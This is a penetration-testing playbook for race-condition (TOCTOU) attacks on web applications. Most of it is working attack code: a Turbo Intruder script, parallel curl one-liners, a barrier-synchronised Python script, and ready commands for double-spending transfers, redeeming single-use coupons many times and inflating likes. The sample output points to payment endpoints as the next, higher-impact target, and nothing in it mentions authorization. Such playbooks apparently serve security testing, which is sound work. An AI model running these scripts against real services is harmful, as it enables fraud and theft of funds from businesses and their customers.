# Playbook: Race Condition Testing

## Purpose
Detect and exploit race conditions (TOCTOU) in business-critical operations.
Covers concurrent request attacks on financial operations, coupon redemption,
vote/like manipulation, and limit bypass scenarios.
Input: authenticated session, state-changing endpoint.

---

## Step 1 — Identify Race Condition Targets

High-value targets where race conditions cause real impact:

```
FINANCIAL:
  - Money transfer between accounts
  - Payment/purchase processing
  - Wallet top-up / withdrawal
  - Refund processing
  - Currency exchange

LIMIT-BASED:
  - Coupon/promo code redemption (use once → use many)
  - Free trial activation
  - Daily/monthly usage limits
  - Rate-limited API operations
  - Invitation code usage

RESOURCE:
  - File upload with unique name requirement
  - Username/email registration (uniqueness check)
  - Inventory/stock purchase (buy more than available)
  - Seat/ticket reservation

PRIVILEGE:
  - Role assignment during registration
  - Account linking/unlinking
  - 2FA enable/disable toggle
  - Permission grant/revoke
```

---

## Step 2 — Single-Packet Attack (Turbo Intruder)

The most effective technique — sends all requests in a single TCP packet
so the server processes them near-simultaneously:

```python
# Burp Turbo Intruder script
# Send N identical requests in one TCP connection

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=50,
                          pipeline=False)

    # Queue 50 identical requests
    for i in range(50):
        engine.queue(target.req, gate='race')

    # Open the gate — all requests sent simultaneously
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

---

## Step 3 — curl-Based Parallel Requests

```bash
# Method 1 — Background curl processes
ENDPOINT="https://TARGET/api/redeem-coupon"
COOKIE="session=AUTHENTICATED_COOKIE"
DATA="coupon_code=FREEITEM2026"

# Fire 20 requests simultaneously
seq 1 20 | xargs -P 20 -I{} \
  curl -sk -o /tmp/race_{}.txt -w "Request {}: %{http_code}\n" \
  -b "$COOKIE" -X POST "$ENDPOINT" -d "$DATA"

# Check results
cat /tmp/race_*.txt | sort | uniq -c | sort -rn

# Method 2 — GNU parallel
seq 1 50 | parallel -j50 \
  "curl -sk -b '$COOKIE' -X POST '$ENDPOINT' -d '$DATA' -o /tmp/race_{}.txt -w '{}: %{http_code}\n'"
```

---

## Step 4 — Python Concurrent Script

```python
#!/usr/bin/env python3
"""Race condition tester using threading."""
import requests
import threading

TARGET = "https://TARGET/api/redeem-coupon"
COOKIES = {"session": "AUTHENTICATED_COOKIE"}
DATA = {"coupon_code": "FREEITEM2026"}
THREADS = 50
results = []

def send_request(thread_id):
    try:
        r = requests.post(TARGET, cookies=COOKIES, data=DATA, verify=False)
        results.append((thread_id, r.status_code, r.text[:100]))
    except Exception as e:
        results.append((thread_id, 0, str(e)))

# Create threads
threads = [threading.Thread(target=send_request, args=(i,)) for i in range(THREADS)]

# Start all at once using barrier
barrier = threading.Barrier(THREADS)
def send_with_barrier(thread_id):
    barrier.wait()  # All threads wait here, then start simultaneously
    send_request(thread_id)

threads = [threading.Thread(target=send_with_barrier, args=(i,)) for i in range(THREADS)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Analyze results
success = [r for r in results if "success" in r[2].lower()]
print(f"Total requests: {len(results)}")
print(f"Successful: {len(success)}")
if len(success) > 1:
    print("[VULNERABLE] Race condition confirmed — coupon redeemed multiple times!")
```

---

## Step 5 — HTTP/2 Single-Packet Attack

```bash
# HTTP/2 allows multiplexing — send multiple requests in one frame
# Using h2load or custom script

# Check if target supports HTTP/2
curl -sk --http2 -I "https://TARGET/" | head -1

# If HTTP/2 supported, requests in the same connection
# are processed more simultaneously than HTTP/1.1
```

---

## Step 6 — Common Race Condition Patterns

### Double Spend / Transfer

```bash
# Account A has 100 TL balance
# Send 2 simultaneous transfers of 100 TL to Account B
# Expected: 1 succeeds, 1 fails (insufficient funds)
# Vulnerable: both succeed → 200 TL transferred from 100 TL balance

ENDPOINT="https://TARGET/api/transfer"
DATA="to_account=B&amount=100"
seq 1 10 | xargs -P 10 -I{} \
  curl -sk -b "$COOKIE" -X POST "$ENDPOINT" -d "$DATA" \
  -o /tmp/transfer_{}.txt -w "{}: %{http_code}\n"
```

### Coupon Multi-Use

```bash
# Single-use coupon applied multiple times
ENDPOINT="https://TARGET/api/apply-coupon"
DATA="code=DISCOUNT50"
seq 1 20 | xargs -P 20 -I{} \
  curl -sk -b "$COOKIE" -X POST "$ENDPOINT" -d "$DATA" \
  -o /tmp/coupon_{}.txt -w "{}: %{http_code}\n"

grep -l "success\|applied\|discount" /tmp/coupon_*.txt | wc -l
```

### Follow/Like Inflation

```bash
# Like a post multiple times simultaneously
ENDPOINT="https://TARGET/api/posts/123/like"
seq 1 50 | xargs -P 50 -I{} \
  curl -sk -b "$COOKIE" -X POST "$ENDPOINT" \
  -o /tmp/like_{}.txt -w "{}: %{http_code}\n"
```

---

## Step 7 — Verify Impact

```bash
# After race condition attack, verify the state:

# Check balance
curl -sk -b "$COOKIE" "https://TARGET/api/balance"

# Check coupon status
curl -sk -b "$COOKIE" "https://TARGET/api/coupons"

# Check like count
curl -sk "https://TARGET/api/posts/123" | grep -i "like"

# Compare before/after state to confirm the race condition
```

---

## Output

```
ENDPOINT      : POST /api/redeem-coupon
CONCURRENCY   : 50 simultaneous requests
RESULT        : Coupon redeemed 4 times (expected: 1)
SEVERITY      : HIGH
IMPACT        : Financial loss — single-use coupon applied multiple times
                Potential for unlimited discount/credit generation
EVIDENCE      : [50 request/response logs, 4 showing success]
NEXT STEPS    : Test on payment/transfer endpoints (higher impact)
```

---

## Tools Reference

```bash
# Turbo Intruder (Burp extension) — best tool for this
# Install via BApp Store

# racepwn
go install github.com/racepwn/racepwn@latest

# For HTTP/2 multiplexing:
# Use custom Python script with httpx or h2 library
```
